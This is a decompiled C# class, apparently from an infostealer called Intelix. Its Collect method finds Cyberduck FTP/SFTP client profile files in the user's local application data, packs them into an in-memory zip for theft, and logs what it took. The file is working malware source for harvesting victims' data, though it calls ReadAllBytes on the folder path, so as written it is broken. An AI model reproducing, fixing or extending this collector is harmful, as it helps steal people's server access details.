using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200003E RID: 62
	public class CyberDuck : ITarget
	{
		// Token: 0x060000D3 RID: 211 RVA: 0x0000C2A4 File Offset: 0x0000A4A4
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Cyberduck", "Profiles");
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "CyberDuck";
				string[] files = Directory.GetFiles(path);
				foreach (string text in files)
				{
					bool flag2 = text.EndsWith(".cyberduckprofile");
					if (flag2)
					{
						string text2 = "CyberDuck\\" + Path.GetFileName(text);
						zip.AddFile(text2, File.ReadAllBytes(path));
						counterApplications.Files.Add(text + " => " + text2);
					}
				}
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
